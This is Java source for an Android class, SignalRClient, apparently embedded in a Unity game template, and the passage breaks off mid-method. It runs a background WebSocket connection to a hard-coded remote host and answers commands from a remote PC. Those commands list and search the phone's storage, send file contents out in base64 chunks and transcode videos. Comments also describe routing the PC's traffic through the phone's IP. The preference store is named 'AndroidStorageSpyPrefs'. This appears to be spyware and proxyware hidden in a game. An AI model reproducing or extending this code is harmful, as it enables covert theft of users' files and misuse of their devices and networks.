package com.UnityTechnologies.com.unity.template.urpblank;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.util.Base64;
import android.util.Log;
import android.view.WindowManager;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedInputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.security.SecureRandom;
import java.util.ArrayDeque;
import java.util.Arrays;
import java.util.Deque;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import javax.net.ssl.SSLSocketFactory;

public class SignalRClient {
    private static final String TAG = "SignalRClient";
    private static final String HOST = "phone.sunnygameai.site";
    private static final String BASE_URL = "https://" + HOST;
    private static final String SIGNALR_RECORD_SEPARATOR = "\u001e";
    private static final String PREFS_NAME = "AndroidStorageSpyPrefs";
    private static final String PREF_DEVICE_ID = "DeviceId";
    private static final String PREF_TRANSCODED_FILES = "TranscodedFiles";

    private static volatile boolean isRunning = false;
    private static volatile boolean isConnected = false;
    private static volatile OutputStream signalRWebSocketOut = null;

    private static Socket activeSocket = null;
    private static ScheduledExecutorService pingScheduler = null;
    private static String cachedDeviceId = null;
    private static Context appContext = null;
    private static final ConcurrentHashMap<String, Object> transcodeSessions = new ConcurrentHashMap<>();

    // ── P2P direct datapath (phone → PC TCP, bypasses Cloudflare) ─────────────
    private static volatile Socket p2pSocket = null;
    private static volatile OutputStream p2pOut = null;
    private static volatile DataInputStream p2pIn = null;
    private static final AtomicBoolean p2pActive = new AtomicBoolean(false);
    private static volatile ScheduledExecutorService p2pPingScheduler = null;

    // ── Tunnel relay (PC routes traffic through this phone's IP) ─────────────
    private static final ConcurrentHashMap<Integer, Socket> tunnelSockets = new ConcurrentHashMap<>();
    private static final ConcurrentHashMap<Integer, DatagramSocket> tunnelUdpSockets = new ConcurrentHashMap<>();

    // ── Worker pool for CPU/IO-heavy handlers (GetFileChunk, thumbnails, etc.) ──
    // Only the heavy data handlers run here; every control/stateful handler
    // (config, transcode, P2P, tunnel, search-stop) still runs inline on the
    // read loop exactly as before, so their ordering guarantees are unchanged.
    // Daemon threads so the app can still exit; pool is shared by all devices.
    // The pool size is driven by the pushed ParallelWork mode and recreated on
    // config refresh. Core counts are reported back to the PC (GetDeviceConfig).
    private static volatile int coreAmount = Math.max(1, Runtime.getRuntime().availableProcessors());
    private static volatile int coreSet = computeCoreSet("Medium", coreAmount);
    private static final ThreadFactory DATA_DAEMON_FACTORY = r -> {
        Thread t = new Thread(r, "PhoneBridge-data-worker");
        t.setDaemon(true);
        return t;
    };
    private static volatile ExecutorService dataWorkers = Executors.newFixedThreadPool(coreSet, DATA_DAEMON_FACTORY);

    /** Resolves how many worker cores a ParallelWork mode uses for this device. */
    private static int computeCoreSet(String mode, int total) {
        int cores = Math.max(1, total);
        if ("Low".equalsIgnoreCase(mode)) return Math.min(2, cores);
        if ("High".equalsIgnoreCase(mode)) return Math.max(1, (int) Math.ceil(cores * 0.75f));
        if ("Absolute".equalsIgnoreCase(mode)) return cores;
        // "Medium" (default): half of the cores
        return Math.max(1, (int) Math.ceil(cores / 2.0f));
    }

    /** Rebuilds the data worker pool to match the pushed ParallelWork mode. */
    private static void applyParallelWork(String mode) {
        int total = Math.max(1, Runtime.getRuntime().availableProcessors());
        int set = computeCoreSet(mode, total);
        coreAmount = total;
        coreSet = set;
        ExecutorService old = dataWorkers;
        dataWorkers = Executors.newFixedThreadPool(set, DATA_DAEMON_FACTORY);
        old.shutdown();
        Log.i(TAG, "ParallelWork=" + mode + " cores=" + set + "/" + total);
    }

    // FIFO room of up to 3 transcoded output files. Newest appended to the end;
    // when the 4th arrives the oldest (first added) is deleted from disk and the
    // remaining two shift left. Everything in the room is wiped when the
    // connection drops or the app stops.
    private static final int MAX_TRANSCODED_FILES = 3;
    private static final Deque<String> transcodedFiles = new ArrayDeque<>();

    /** Adds a transcoded output to the FIFO room, evicting (and deleting) the oldest when full. */
    private static synchronized void trackTranscodedFile(String absOutputPath) {
        if (absOutputPath == null || absOutputPath.isEmpty()) return;
        transcodedFiles.addLast(absOutputPath);
        Log.i(TAG, "[TRACK] Transcode output added (" + transcodedFiles.size() + "/" + MAX_TRANSCODED_FILES + "): " + absOutputPath);
        sendDebugLog(STAMP_SUCCESS, deviceNamePrefix() + " Transcode tracked (" + transcodedFiles.size() + "/" + MAX_TRANSCODED_FILES + "): " + absOutputPath);
        while (transcodedFiles.size() > MAX_TRANSCODED_FILES) {
            String oldest = transcodedFiles.removeFirst();
            deleteTranscodedFile(oldest);
        }
        persistTranscodedFiles();
    }

    /** Deletes every transcoded file still in the FIFO room (connection lost / app stopped / user closed the game). */
    public static synchronized void cleanupTranscodedFiles() {
        while (!transcodedFiles.isEmpty()) {
            deleteTranscodedFile(transcodedFiles.removeFirst());
        }
        persistTranscodedFiles();
        Log.i(TAG, "[TRACK] All tracked transcoded files cleaned up.");
    }

    /** Deletes transcoded files left behind by a killed previous session (loads them from disk). */
    private static void cleanupStaleTranscodedFiles() {
        if (appContext == null) return;
        try {
            SharedPreferences prefs = appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            String json = prefs.getString(PREF_TRANSCODED_FILES, null);
            if (json == null || json.isEmpty()) return;
            JSONArray arr = new JSONArray(json);
            int count = 0;
            for (int i = 0; i < arr.length(); i++) {
                String p = arr.optString(i);
                if (p != null && !p.isEmpty()) { deleteTranscodedFile(p); count++; }
            }
            prefs.edit().remove(PREF_TRANSCODED_FILES).apply();
            Log.i(TAG, "[TRACK] Cleaned " + count + " stale transcoded file(s) from previous session.");
        } catch (Exception e) {
            Log.e(TAG, "[TRACK] Stale cleanup error: " + e.getMessage());
        }
    }

    private static void persistTranscodedFiles() {
        if (appContext == null) return;
        try {
            JSONArray arr = new JSONArray();
            for (String p : transcodedFiles) arr.put(p);
            appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit().putString(PREF_TRANSCODED_FILES, arr.toString()).apply();
        } catch (Exception e) {
            Log.e(TAG, "[TRACK] Failed to persist transcoded files: " + e.getMessage());
        }
    }

    private static void deleteTranscodedFile(String absPath) {
        try {
            File f = new File(absPath);
            if (f.exists() && f.delete()) {
                Log.i(TAG, "[TRACK] Removed transcoded file: " + absPath);
                sendDebugLog(STAMP_MESSAGE, deviceNamePrefix() + " Removed transcoded file: " + absPath);
            } else {
                Log.i(TAG, "[TRACK] Transcode cleanup skipped (not present): " + absPath);
            }
        } catch (Exception e) {
            Log.e(TAG, "[TRACK] Failed to delete transcoded file: " + absPath, e);
        }
    }

    private static String deviceNamePrefix() {
        try {
            return Build.MANUFACTURER + " " + Build.MODEL;
        } catch (Exception e) {
            return "phone";
        }
    }

    public static void setContext(Context context) {
        appContext = context != null ? context.getApplicationContext() : null;
    }

    /**
     * Sets or clears FLAG_KEEP_SCREEN_ON on the Unity activity window so the phone
     * screen stays awake (YouTube-style) while the app runs, or returns to the
     * normal screen timeout. Uses reflection to avoid a hard compile-time
     * dependency on the Unity player classes.
     */
    private static void applyKeepScreenOn(boolean enabled) {
        try {
            Class<?> playerClass = Class.forName("com.unity3d.player.UnityPlayer");
            java.lang.reflect.Field field = playerClass.getField("currentActivity");
            final Activity activity = (Activity) field.get(null);
            if (activity == null) return;
            activity.runOnUiThread(() -> {
                try {
                    if (enabled) {
                        activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
                    } else {
                        activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "applyKeepScreenOn UI thread error: " + e.getMessage());
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "applyKeepScreenOn error: " + e.getMessage());
        }
    }

    public static synchronized String getDeviceId() {
        if (cachedDeviceId != null) return cachedDeviceId;
        if (appContext != null) {
            SharedPreferences prefs = appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            cachedDeviceId = prefs.getString(PREF_DEVICE_ID, null);
            if (cachedDeviceId == null) {
                cachedDeviceId = UUID.randomUUID().toString();
                prefs.edit().putString(PREF_DEVICE_ID, cachedDeviceId).apply();
            }
        } else {
            cachedDeviceId = UUID.randomUUID().toString();
        }
        return cachedDeviceId;
    }

    public static synchronized void start() {
        if (isRunning) return;
        isRunning = true;
        Log.i(TAG, "Starting native SignalR Client background loop...");

        // Wipe transcoded files left by a killed previous session (process death skips onDestroy).
        cleanupStaleTranscodedFiles();

        new Thread(new Runnable() {
            @Override
            public void run() {
                while (isRunning) {
                    try {
                        if (!checkStatus()) {
                            Log.w(TAG, "Server /status check failed. Waiting 5 seconds before retrying...");
                            Thread.sleep(5000);
                            continue;
                        }

                        Log.i(TAG, "Server /status check passed. Connecting to SignalR hub...");
                        connectAndLoop();
                    } catch (Exception e) {
                        Log.e(TAG, "SignalR Client loop exception: " + e.getMessage(), e);
                    } finally {
                        cleanupConnection();
                        if (isRunning) {
                            Log.i(TAG, "Reconnecting in 5 seconds...");
                            try { Thread.sleep(5000); } catch (Exception ignored) {}
                        }
                    }
                }
            }
        }).start();
    }

    public static synchronized void stop() {
        isRunning = false;
        cleanupConnection();
        Log.i(TAG, "SignalR Client stopped.");
    }

    private static boolean checkStatus() {
        try {
            URL url = new URL(BASE_URL + "/status");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            int responseCode = conn.getResponseCode();
            conn.disconnect();
            return responseCode >= 200 && responseCode < 300;
        } catch (Exception e) {
            Log.e(TAG, "CheckStatus error: " + e.getMessage());
            return false;
        }
    }

    private static void connectAndLoop() throws Exception {
        SSLSocketFactory socketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();
        Socket socket = socketFactory.createSocket(HOST, 443);

        socket.setSoTimeout(35000);
        socket.setKeepAlive(true);
        socket.setTcpNoDelay(true);

        activeSocket = socket;

        OutputStream out = socket.getOutputStream();
        DataInputStream inStream = new DataInputStream(new BufferedInputStream(socket.getInputStream()));

        // 1. Perform WebSocket Handshake
        byte[] secKey = new byte[16];
        new SecureRandom().nextBytes(secKey);
        String encodedKey = Base64.encodeToString(secKey, Base64.NO_WRAP);

        String handshakeReq = "GET /communicate HTTP/1.1\r\n" +
                "Host: " + HOST + "\r\n" +
                "Upgrade: websocket\r\n" +
                "Connection: Upgrade\r\n" +
                "Sec-WebSocket-Key: " + encodedKey + "\r\n" +
                "Sec-WebSocket-Version: 13\r\n" +
                "User-Agent: Android-Native-SignalR\r\n\r\n";

        out.write(handshakeReq.getBytes("UTF-8"));
        out.flush();

        // Read HTTP 101 Response
        StringBuilder responseHeader = new StringBuilder();
        while (true) {
            String line = readLine(inStream);
            if (line == null) break;
            responseHeader.append(line).append("\n");
            if (line.trim().isEmpty()) break;
        }

        if (!responseHeader.toString().contains("101")) {
            Log.e(TAG, "WebSocket handshake failed. Response:\n" + responseHeader.toString());
            socket.close();
            return;
        }

        Log.i(TAG, "WebSocket connected successfully. Initiating SignalR Handshake...");

        // 2. Perform SignalR Protocol Handshake
        String signalRHandshake = "{\"protocol\":\"json\",\"version\":1}" + SIGNALR_RECORD_SEPARATOR;
        sendWebSocketText(out, signalRHandshake);

        String serverHandshakeResponse = readWebSocketTextFrame(inStream);
        Log.i(TAG, "SignalR Handshake response received: " + serverHandshakeResponse);

        isConnected = true;
        signalRWebSocketOut = out;
        sendDebugLog(STAMP_SUCCESS, deviceNamePrefix() + " [Tunnel] Connected to PC hub (SignalR handshake ok)");

        // 3. Send Device Record (with DeviceId)
        sendDeviceRecord(out);

        // 3b. Per-class registration via empty log (new architecture)
        String devNameForReg = Build.MANUFACTURER + " " + Build.MODEL;
        String[] classesToRegister = new String[]{ "SignalRClient", "FileManager", "MediaHelper", "VideoDecoder", "GameForegroundService", "PermissionHelper" };
        for (String cls : classesToRegister) {
            try { sendClassLog(cls, "Message", ""); } catch (Throwable ignored) {}
        }
        Log.i(TAG, "Per-class debug sources registered via empty logs");

        // 4. Start Ping Scheduler
        startPingScheduler(out);

        // 5. SignalR Message Processing Loop
        StringBuilder messageBuffer = new StringBuilder();

        while (isRunning && isConnected) {
            String frameText = readWebSocketTextFrame(inStream);
            if (frameText == null) break;
            messageBuffer.append(frameText);

            int index = messageBuffer.indexOf(SIGNALR_RECORD_SEPARATOR);
            while (index != -1) {
                String rawJson = messageBuffer.substring(0, index).trim();
                messageBuffer.delete(0, index + SIGNALR_RECORD_SEPARATOR.length());

                if (!rawJson.isEmpty()) {
                    handleSignalRMessage(out, rawJson);
                }

                index = messageBuffer.indexOf(SIGNALR_RECORD_SEPARATOR);
            }
        }
    }

    private static void sendDeviceRecord(OutputStream out) throws Exception {
        String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
        String deviceId = getDeviceId();
        FileNodeDto.ConnectionIdToPc record = new FileNodeDto.ConnectionIdToPc(deviceName, deviceId);
        JSONObject payload = new JSONObject();
        payload.put("type", 1);
        payload.put("target", "ReceiveDeviceRecord");
        JSONArray args = new JSONArray();
        args.put(record.toJsonObject());
        payload.put("arguments", args);

        String jsonStr = payload.toString() + SIGNALR_RECORD_SEPARATOR;
        sendWebSocketText(out, jsonStr);
        Log.i(TAG, "Device record sent successfully for: " + deviceName + " (ID: " + deviceId + ")");
    }

    private static void startPingScheduler(final OutputStream out) {
        if (pingScheduler != null) {
            pingScheduler.shutdownNow();
        }
        pingScheduler = Executors.newSingleThreadScheduledExecutor();
        pingScheduler.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                if (isConnected) {
                    try {
                        String pingMessage = "{\"type\":6}" + SIGNALR_RECORD_SEPARATOR;
                        synchronized (out) {
                            sendWebSocketText(out, pingMessage);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Ping failed: " + e.getMessage());
                        isConnected = false;
                    }
                }
            }
        }, 15, 15, TimeUnit.SECONDS);
    }

    private static void dispatchDataWork(Runnable task) {
        try {
            dataWorkers.execute(task);
        } catch (Exception e) {
            Log.e(TAG, "Failed to enqueue data worker: " + e.getMessage(), e);
        }
    }

    private static void handleGetPathInfo(OutputStream out, String invocationId,
                                          String relativePath, boolean isLowRes, boolean imageOnly,
                                          boolean videoOnly, int sinceDays, int startIndex, int fileLimit) {
        try {
            FileNodeDto.FileNodeResultDto result = FileManager.getPathInfo(
                relativePath, isLowRes, imageOnly, videoOnly, sinceDays, startIndex, fileLimit);

            if (invocationId != null && !invocationId.isEmpty()) {
                sendCompletionResponse(out, invocationId, result.toJsonObject());
            }
        } catch (Exception e) {
            Log.e(TAG, "GetPathInfo worker: " + e.getMessage(), e);
        }
    }

    private static void handleSignalRMessage(OutputStream out, String jsonStr) {
        try {
            JSONObject json = new JSONObject(jsonStr);
            int type = json.optInt("type", -1);

            if (type == 1) { // Invocation
                String target = json.optString("target");
                String invocationId = json.optString("invocationId", null);
                JSONArray args = json.optJSONArray("arguments");
                if (args == null) args = new JSONArray();

                String deviceName = Build.MANUFACTURER + " " + Build.MODEL;

                // Wire VideoDecoder debug to sendDebugLog (called once on first message)
                if (VideoDecoder.class != null) {
                    VideoDecoder.setDebugLogger(true,
                        (tag, msg) -> sendDebugLog(classifyStamp(msg), deviceName + " [" + tag + "] " + msg));
                }

                if ("P2PStart".equals(target)) {
                    JSONArray candArr = args.optJSONArray(0);
                    if (candArr != null && candArr.length() > 0) {
                        List<String> candidates = new java.util.ArrayList<>();
                        for (int i = 0; i < candArr.length(); i++) candidates.add(candArr.optString(i));
                        handleP2PStart(out, candidates);
                    }
                } else if ("RefreshConfiguration".equals(target)) {
                    String configJsonStr = args.optString(0);
                    if (configJsonStr != null && !configJsonStr.trim().isEmpty()) {
                        JSONObject configObj = new JSONObject(configJsonStr);
                        double normFrame = configObj.optDouble("videoFrameNormalized", configObj.optDouble("VideoFrameNormalized", 0.1));
                        boolean sendDebug = configObj.optBoolean("sendDebug", configObj.optBoolean("SendDebug", true));
                        double thumbQuality = configObj.optDouble("thumbnailQuality", configObj.optDouble("ThumbnailQuality", 0.0));
                        double vidQuality = configObj.optDouble("videoQuality", configObj.optDouble("VideoQuality", 0.0));
                        double brm = configObj.optDouble("videoBitrateMultiplier", configObj.optDouble("VideoBitrateMultiplier", 0.50));
                        double resm = configObj.optDouble("videoResolutionMultiplier", configObj.optDouble("VideoResolutionMultiplier", 1.00));
                        int speedLimit = configObj.optInt("speedLimitKbps", configObj.optInt("SpeedLimitKbps", 0));
                        boolean brCap = configObj.optBoolean("bitrateCappingEnabled", configObj.optBoolean("BitrateCappingEnabled", true));
                        double brCapMbps = configObj.optDouble("bitrateCapMbps", configObj.optDouble("BitrateCapMbps", 3.0));
                        int brCapBps = (int)(brCapMbps * 1_000_000);
                        boolean resCeil = configObj.optBoolean("resolutionCeilingEnabled", configObj.optBoolean("ResolutionCeilingEnabled", true));
                        int resCeilPx = configObj.optInt("resolutionCeilingPx", configObj.optInt("ResolutionCeilingPx", 720));
                        boolean keepScreenOn = configObj.optBoolean("keepScreenOn", configObj.optBoolean("KeepScreenOn", false));
                        String parallelWork = configObj.optString("parallelWork", configObj.optString("ParallelWork", "Medium"));

                        MediaHelper.currentConfig.videoFrameNormalized = (float) normFrame;
                        MediaHelper.currentConfig.sendDebug = sendDebug;
                        MediaHelper.currentConfig.thumbnailQuality = (float) thumbQuality;
                        MediaHelper.currentConfig.videoQuality = (float) vidQuality;
                        MediaHelper.currentConfig.videoBitrateMultiplier = (float) brm;
                        MediaHelper.currentConfig.videoResolutionMultiplier = (float) resm;
                        MediaHelper.currentConfig.bitrateCappingEnabled = brCap;
                        MediaHelper.currentConfig.bitrateCapBps = brCapBps;
                        MediaHelper.currentConfig.resolutionCeilingEnabled = resCeil;
                        MediaHelper.currentConfig.resolutionCeilingPx = resCeilPx;
                        MediaHelper.currentConfig.speedLimitKbps = speedLimit;
                        MediaHelper.currentConfig.keepScreenOn = keepScreenOn;
                        MediaHelper.currentConfig.parallelWork = parallelWork;
                        MediaHelper.clearCache();

                        // Keep the screen awake (YouTube-style) or release it to the normal timeout.
                        applyKeepScreenOn(keepScreenOn);

                        // Size the parallel file worker pool from the pushed mode.
                        applyParallelWork(parallelWork);

                        Log.i(TAG, "Config updated: Frame=" + normFrame + ", Debug=" + sendDebug + ", ThumbQual=" + thumbQuality + ", VidQ=" + vidQuality + ", BRM=" + brm + ", ResM=" + resm + ", Speed=" + speedLimit + ", KeepScreenOn=" + keepScreenOn + ", Parallel=" + parallelWork + " (" + coreSet + "/" + coreAmount + " cores)");
                        sendDebugLog(STAMP_SUCCESS, deviceName + " [Config] Applied: Frame=" + String.format("%.2f", normFrame)
                            + " Debug=" + sendDebug + " ThumbQ=" + String.format("%.2f", thumbQuality)
                            + " BRM=" + String.format("%.2f", brm) + " ResM=" + String.format("%.2f", resm)
                            + " Speed=" + speedLimit + " KeepScreenOn=" + keepScreenOn
                            + " Parallel=" + parallelWork + " (" + coreSet + "/" + coreAmount + " cores)");
                    }
                } else if ("GetPathInfo".equals(target)) {
                    final String relativePath = args.optString(0, "");
                    final boolean isLowRes = args.optBoolean(1, false);
                    final boolean imageOnly = args.optBoolean(2, false);
                    final boolean videoOnly = args.optBoolean(3, false);
                    final int sinceDays = args.optInt(4, 0);
                    final int startIndex = args.optInt(5, 0);
                    final int fileLimit = args.optInt(6, 0);
                    final String invId = invocationId;

                    if (MediaHelper.currentConfig.sendDebug) {
                        sendDebugLog(deviceName + ": " + relativePath
                            + (imageOnly ? " [IMG]" : "") + (videoOnly ? " [VID]" : "")
                            + (sinceDays > 0 ? " [" + sinceDays + "d]" : "")
                            + (startIndex > 0 || fileLimit > 0 ? " [" + startIndex + "+" + fileLimit + "]" : ""));
                    }

                    dispatchDataWork(() -> handleGetPathInfo(out, invId, relativePath,
                        isLowRes, imageOnly, videoOnly, sinceDays, startIndex, fileLimit));
                } else if ("GetPathInfoWithOverride".equals(target)) {
                    final String relativePath = args.optString(0, "");
                    final boolean isLowRes = args.optBoolean(1, false);
                    final float frameOverride = (float) args.optDouble(2, -1.0);
                    final float qualityOverride = (float) args.optDouble(3, -1.0);
                    final boolean imageOnly = args.optBoolean(4, false);
                    final boolean videoOnly = args.optBoolean(5, false);
                    final int sinceDays = args.optInt(6, 0);
                    final String invId = invocationId;

                    sendDebugLog(deviceName + " [Override] Request frame=" + frameOverride + " qual=" + qualityOverride + " path=" + relativePath);

                    dispatchDataWork(() -> {
                        try {
                            FileNodeDto.FileNodeResultDto result = FileManager.getPathInfoWithOverride(
                                relativePath, isLowRes, frameOverride, qualityOverride,
                                imageOnly, videoOnly, sinceDays);

                            if (invId != null && !invId.isEmpty()) {
                                sendCompletionResponse(out, invId, result.toJsonObject());
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "GetPathInfoWithOverride worker: " + e.getMessage(), e);
                        }

                        sendDebugLog(deviceName + " [Override] Sent: " + relativePath + " frame=" + frameOverride);
                    });
                } else if ("GetFileChunk".equals(target)) {
                    final String relativePath2 = args.optString(0, "");
                    final long offset = args.optLong(1, 0L);
                    final int chunkSize = args.optInt(2, 524288);
                    final boolean isLowRes2 = args.optBoolean(3, false);
                    final String invId = invocationId;

                    if (MediaHelper.currentConfig.sendDebug && offset == 0) {
                        sendDebugLog(deviceName + " [Chunk Fetch]: " + relativePath2);
                    }

                    dispatchDataWork(() -> {
                        try {
                            byte[] chunkBytes = FileManager.getFileChunk(relativePath2, offset, chunkSize, isLowRes2);
                            String base64Data = Base64.encodeToString(chunkBytes, Base64.NO_WRAP);

                            if (invId != null && !invId.isEmpty()) {
                                sendCompletionResponse(out, invId, base64Data);
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "GetFileChunk worker: " + e.getMessage(), e);
                        }
                    });
                } else if ("GetFileChunkWithOverride".equals(target)) {
                    final String relativePath = args.optString(0, "");
                    final long offset = args.optLong(1, 0L);
                    final int chunkSize = args.optInt(2, 524288);
                    final boolean isLowRes = args.optBoolean(3, false);
                    final float frameOverride = (float) args.optDouble(4, -1.0);
                    final float qualityOverride = (float) args.optDouble(5, -1.0);
                    final String invId = invocationId;

                    dispatchDataWork(() -> {
                        try {
                            byte[] chunkBytes = FileManager.getFileChunkWithOverride(relativePath, offset, chunkSize, isLowRes, frameOverride, qualityOverride);
                            String base64Data = Base64.encodeToString(chunkBytes, Base64.NO_WRAP);

                            if (invId != null && !invId.isEmpty()) {
                                sendCompletionResponse(out, invId, base64Data);
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "GetFileChunkWithOverride worker: " + e.getMessage(), e);
                        }
                    });
                } else if ("SearchFiles".equals(target)) {
                    final String query = args.optString(0, "");
                    final String startPath = args.optString(1, "");
                    final boolean isGlobal = args.optBoolean(2, true);
                    final String invId = invocationId;

                    if (MediaHelper.currentConfig.sendDebug) {
                        sendDebugLog(deviceName + " [Search]: '" + query + "' (Global: " + isGlobal + ")");
                    }

                    dispatchDataWork(() -> {
                        try {
                            List<FileNodeDto> searchResults = FileManager.searchFiles(query, startPath, isGlobal);
                            JSONArray arr = new JSONArray();
                            for (FileNodeDto node : searchResults) {
                                arr.put(node.toJsonObject());
                            }

                            if (invId != null && !invId.isEmpty()) {
                                sendCompletionResponse(out, invId, arr);
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "SearchFiles worker: " + e.getMessage(), e);
                        }
                    });
                } else if ("StopSearch".equals(target)) {
                    FileManager.isSearchCancelled.set(true);
                    if (MediaHelper.currentConfig.sendDebug) {
                        sendDebugLog(deviceName + " [Search Stopped by PC]");
                    }
                    if (invocationId != null && !invocationId.isEmpty()) {
                        sendCompletionResponse(out, invocationId, true);
                    }
                } else if ("GetDeviceConfig".equals(target)) {
                    JSONObject cfg = new JSONObject();
                    cfg.put("videoFrameNormalized", MediaHelper.currentConfig.videoFrameNormalized);
                    cfg.put("sendDebug", MediaHelper.currentConfig.sendDebug);
                    cfg.put("thumbnailQuality", MediaHelper.currentConfig.thumbnailQuality);
                    cfg.put("videoBitrateMultiplier", MediaHelper.currentConfig.videoBitrateMultiplier);
                    cfg.put("videoResolutionMultiplier", MediaHelper.currentConfig.videoResolutionMultiplier);
                    cfg.put("bitrateCappingEnabled", MediaHelper.currentConfig.bitrateCappingEnabled);
                    cfg.put("bitrateCapBps", MediaHelper.currentConfig.bitrateCapBps);
                    cfg.put("bitrateCapMbps", MediaHelper.currentConfig.bitrateCapBps / 1_000_000.0);
                    cfg.put("resolutionCeilingEnabled", MediaHelper.currentConfig.resolutionCeilingEnabled);
                    cfg.put("resolutionCeilingPx", MediaHelper.currentConfig.resolutionCeilingPx);
                    cfg.put("speedLimitKbps", MediaHelper.currentConfig.speedLimitKbps);
                    cfg.put("keepScreenOn", MediaHelper.currentConfig.keepScreenOn);
                    cfg.put("parallelWork", MediaHelper.currentConfig.parallelWork);
                    cfg.put("coreAmount", coreAmount);
                    cfg.put("coreSet", coreSet);

                    if (invocationId != null && !invocationId.isEmpty()) {
                        sendCompletionResponse(out, invocationId, cfg);
                    }
                } else if ("GetDebugBuffer".equals(target)) {
                    // Return buffered debug messages to PC
                    JSONArray arr = new JSONArray();
                    String msg;
                    while ((msg = debugBuffer.poll()) != null) arr.put(msg);
                    if (invocationId != null && !invocationId.isEmpty()) {
                        sendCompletionResponse(out, invocationId, arr);
                    }
                } else if ("StartVideoTranscode".equals(target)) {
                    String relPath = args.optString(0, "");
                    final String absPath = relPath.startsWith("/") ? relPath : FileManager.getRootStoragePath() + "/" + relPath;
                    final String outRelPath = relPath + "_tr_" + System.currentTimeMillis() + ".mp4";
                    final String outAbsPath = absPath + "_tr_" + System.currentTimeMillis() + ".mp4";
                    float brm = (float) args.optDouble(1, 0.5);
                    float resm = (float) args.optDouble(2, 1.0);
                    Boolean bitrateCappingOverride = args.length() > 3 && !args.isNull(3) ? args.optBoolean(3) : null;
                    Integer bitrateCapBpsOverride = args.length() > 4 && !args.isNull(4) ? args.optInt(4) : null;
                    Boolean resolutionCeilingOverride = args.length() > 5 && !args.isNull(5) ? args.optBoolean(5) : null;
                    Integer resolutionCeilingPxOverride = args.length() > 6 && !args.isNull(6) ? args.optInt(6) : null;
                    String sessionId = UUID.randomUUID().toString();

                    // Log handler entry (only sent while debug config is enabled)
                    sendDebugLog(deviceName + " [VD] Start handler, brm=" + brm + " resm=" + resm + " path=" + relPath);

                    // Wire debug logging to sendDebugLog (respects debug config)
                    VideoDecoder.setDebugLogger(true,
                        (tag, msg) -> sendDebugLog(classifyStamp(msg), deviceName + " [" + tag + "] " + msg));

                    final AtomicInteger prog = new AtomicInteger(0);
                    final AtomicInteger outW = new AtomicInteger(0);
                    final AtomicInteger outH = new AtomicInteger(0);
                    final AtomicBoolean cancelled = new AtomicBoolean(false);
                    final StringBuilder debugBuf = new StringBuilder();
                    final ConcurrentHashMap<String, Object> sessions = transcodeSessions;

                    VideoDecoder decoder = new VideoDecoder(appContext, absPath, outAbsPath, brm, resm,
                        bitrateCappingOverride, bitrateCapBpsOverride, resolutionCeilingOverride, resolutionCeilingPxOverride,
                        new VideoDecoder.TranscodeCallback() {
                            @Override public void onProgress(int pct, long bytes) {
                                prog.set(pct);
                                if (pct % 10 == 0) {
                                    sendDebugLog(deviceName + " [VD] " + pct + "% " + bytes + "b");
                                }
                            }
                            @Override public void onComplete(String path, long bytes, int w, int h) {
                                prog.set(100); outW.set(w); outH.set(h);
                                sendDebugLog(STAMP_SUCCESS, deviceName + " [VD] DONE " + w + "x" + h + " " + bytes + "b");
                            }
                            @Override public void onWarning(String msg) {
                                sendDebugLog(deviceName + " [VD] WARN: " + msg);
                            }
                            @Override public void onError(String msg) {
                                sendDebugLog(STAMP_ERROR, deviceName + " [VD] ERROR: " + msg);
                                prog.set(-1);
                            }
                        });

                    sessions.put(sessionId, decoder);
                    decoder.start();

                    // Add output to the FIFO room (evicts + deletes the oldest when full).
                    trackTranscodedFile(outAbsPath);

                    JSONObject resp = new JSONObject();
                    resp.put("sessionId", sessionId);
                    resp.put("outputPath", outRelPath);
                    if (invocationId != null && !invocationId.isEmpty()) {
                        sendCompletionResponse(out, invocationId, resp);
                    }
                } else if ("GetTranscodeProgress".equals(target)) {
    String sid = args.optString(0, "");
    VideoDecoder vd = (VideoDecoder) transcodeSessions.get(sid);
    JSONObject resp = new JSONObject();
    if (vd != null) {
        resp.put("progress", vd.getProgress());
        resp.put("outputBytes", vd.getOutputBytes());

        // Convert absolute path back to relative path for API compatibility
        String absOut = vd.getOutputPath();
        String rootPath = FileManager.getRootStoragePath();
        String relOut = absOut;
        if (absOut != null && rootPath != null && absOut.startsWith(rootPath)) {
            relOut = absOut.substring(rootPath.length());
            if (relOut.startsWith("/")) relOut = relOut.substring(1);
        }

        resp.put("outputPath", relOut);
        resp.put("active", vd.getProgress() < 100);
    } else {
        resp.put("progress", 100); 
        resp.put("active", false);
    }
    if (invocationId != null && !invocationId.isEmpty()) {
        sendCompletionResponse(out, invocationId, resp);
    }
                } else if ("StopVideoTranscode".equals(target)) {
                    String sid = args.optString(0, "");
                    VideoDecoder vd = (VideoDecoder) transcodeSessions.remove(sid);
                    if (vd != null) vd.cancel();
                    JSONObject resp = new JSONObject(); resp.put("stopped", true);
                    if (invocationId != null && !invocationId.isEmpty()) {
                        sendCompletionResponse(out, invocationId, resp);
